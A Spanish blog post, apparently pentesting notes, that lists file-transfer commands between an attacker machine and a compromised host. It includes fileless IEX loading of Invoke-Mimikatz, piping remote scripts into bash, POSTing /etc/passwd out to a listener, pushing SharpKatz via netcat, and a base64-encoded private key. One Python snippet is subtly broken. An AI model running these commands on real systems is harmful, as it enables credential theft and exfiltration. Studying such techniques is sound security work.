---
date: 2022-09-11T03:41:05.000Z
layout: post
comments: true
title: Transferencia de archivos
subtitle: 'en Linux y Windows'
description: >-
image: >-
  http://imgfz.com/i/YdN4mOs.jpeg
optimized_image: >-
  http://imgfz.com/i/YdN4mOs.jpeg
category: ciberseguridad
tags:
  - subida
  - archivos
  - carga
  - file
  - upload
  - transfer
  - powershell
  - wget
  - curl
  - hacking
author: Felipe Canales Cayuqueo
paginate: true
---


### Problema con canal seguro SSL/TLS

```powershell
PS C:\> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### PowerShell Base64

```bash
┌──(root㉿kali)-[/]
└─ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

```bash
┌──(root㉿kali)-[/]
└─ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

```powershell
PS C:\> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))

```

```powershell
PS C:\> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```

#### Otra opción

```powershell
PS C:\> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
PS C:\> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```

```bash
┌──(root㉿kali)-[/]
└─ echo 'IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=' | base64 -d; echo


3688374325b992def12793500307566d
```

### Descargar archivos con PowerShell

```powershell
PS C:\> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

```powershell
PS C:\> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
```

### PowerShell sin archivos

```powershell
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

```powershell
PS C:\> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### PowerShell 3.0 Invoke-WebRequest

```powershell
PS C:\> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

```powershell
PS C:\> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -UseBasicParsing | IEX
```


### SMB

```bash
┌──(root㉿kali)-[/]
└─ impacket-smbserver smbFolder $(pwd) -smb2support
```

```
C:\> copy \\10.1.1.5\smbFolder\nc.exe

        1 file(s) copied.
```

```bash
### Otra opción
┌──(root㉿kali)-[/]
└─ impacket-smbserver share -smb2support /tmp/smbshare
```

```
C:\> copy \\10.1.1.5\share\nc.exe

        1 file(s) copied.
```

### SMB con autenticación

```bash
┌──(root㉿kali)-[/]
└─ impacket-smbserver smbFolder $(pwd) -smb2support -user test -password test
```

```
C:\> net use n: \\10.1.1.5\smbFolder /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```

### FTP descarga con PowerShell

```bash
┌──(root㉿kali)-[/]
└─ pip3 install pyftpdlib
```

```bash
┌──(root㉿kali)-[/]
└─ python3 -m pyftpdlib --port 21
```

```powershell
PS C:\> (New-Object Net.WebClient).DownloadFile('ftp://10.1.1.5/file.txt', 'ftp-file.txt')
```

#### Estando conectado a ftp (Descargar)

```
ftp> GET file.txt
```

### FTP carga con PowerShell

```bash
┌──(root㉿kali)-[/]
└─ python3 -m pyftpdlib --port 21 --write
```

```powershell
PS C:\> (New-Object Net.WebClient).UploadFile('ftp://10.1.1.5/test.txt', 'ftp-test.txt')
```

#### Estando conectado a ftp (Cargar) 

```
ftp> PUT test.txt
```

### Cargas Web en PowrShell

```bash
┌──(root㉿kali)-[/]
└─ pip3 install uploadserver
```

```bash
┌──(root㉿kali)-[/]
└─ python3 -m uploadserver
```

```powershell
PS C:\> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\> Invoke-FileUpload -Uri http://10.1.1.5:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

#### Base64

```bash
### Para capturar los datos en base64
┌──(root㉿kali)-[/]
└─ nc -nlvp 8000
```

```powershell
PS C:\> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\> Invoke-WebRequest -Uri http://10.1.1.5:8000/ -Method POST -Body $b64
```

### WebDav Python

```bash
┌──(root㉿kali)-[/]
└─ pip install wsgidav cheroot
```

```bash
┌──(root㉿kali)-[/]
└─ wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

```
C:\> dir \\10.1.1.5\DavWWWRoot

 Volume in drive \\10.1.1.5\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\10.1.1.5\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```

#### Subir archivos

```
C:\> copy C:\Users\john\Desktop\SourceCode.zip \\10.1.1.5\DavWWWRoot\
```

### Descargar archivo con wget

```bash
┌──(root㉿kali)-[/]
└─ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

### Descarga sin archivos con wget

```bash
┌──(root㉿kali)-[/]
└─ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/test.py | python3
```

### Descargar archivo con cURL

```bash
┌──(root㉿kali)-[/]
└─ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### Descarga sin archivos con cURL

```bash
┌──(root㉿kali)-[/]
└─ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

### Descargar con Bash

```bash
┌──(root㉿kali)-[/]
└─ exec 3<>/dev/tcp/10.10.10.25/80
```

```bash
┌──(root㉿kali)-[/]
└─ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

```bash
┌──(root㉿kali)-[/]
└─ cat <&3
```

### Descarga por SSH

```bash
┌──(root㉿kali)-[/]
└─ systemctl enable ssh
```

```bash
┌──(root㉿kali)-[/]
└─ systemctl start ssh
```

```bash
┌──(root㉿kali)-[/]
└─ netstat -lnpt
### Se verfica que esté en escucha el puerto 22
```

```bash
┌──(root㉿kali)-[/]
└─ scp plaintext@10.1.1.5:/root/myroot.txt . 
```

### Subida de archivo con python

```bash
┌──(root㉿kali)-[/]
└─ python3 -m http.server
```

Código en python3 directamente en bash:

```bash
┌──(root㉿kali)-[/]
└─ python3 -c 'import requests;requests.post("http://10.1.1.5:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

Otra opción es la siguiente:

```bash
┌──(root㉿kali)-[/]
└─ python -m http.server
```

Código en python:

```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://10.1.1.5:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```

Para descargar el archivo con wget

```bash
┌──(root㉿kali)-[/]
└─ wget 192.168.49.128:8000/filetotransfer.txt
```

Para descargar directamente desde ```python``` como con ```wget```:

```bash
┌──(root㉿kali)-[/]
└─ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

```bash
┌──(root㉿kali)-[/]
└─ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

### Ruby

```bash
┌──(root㉿kali)-[/]
└─ ruby -run -ehttpd . -p8000
```

```bash
┌──(root㉿kali)-[/]
└─ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

### PHP

```bash
┌──(root㉿kali)-[/]
└─ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

```bash
┌──(root㉿kali)-[/]
└─ php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

```bash
┌──(root㉿kali)-[/]
└─ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

### Perl

```bash
┌──(root㉿kali)-[/]
└─ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

### wget.js

```js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

#### Desde Windows

```
C:\> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

### Netcat

En la máquina comprometida realizamos lo siguiente:

```bash
┌──(root㉿kali)-[/]
└─ nc -l -p 8000 > SharpKatz.exe
```

En nuestra máquina de atacante escribimos los siguientes comandos:

```bash
┌──(root㉿kali)-[/]
└─ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe

┌──(root㉿kali)-[/]
└─ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

### Montar una Carpeta por RDP

#### rdesktop

```bash
┌──(root㉿kali)-[/]
└─ rdesktop 10.1.1.5 -d domain -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

#### xfreerdp

```bash
┌──(root㉿kali)-[/]
└─ xfreerdp /v:10.1.1.5 /d:domain /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/test/free/filetransfer
```

> Para encontrar otras formas de descargas se recomienda visitar para Linux, [GTFOBins](https://gtfobins.github.io/) buscando con el parámetro +file upload y para Windows, [LOLBAS](https://lolbas-project.github.io/) buscando con el parámetro /upload.
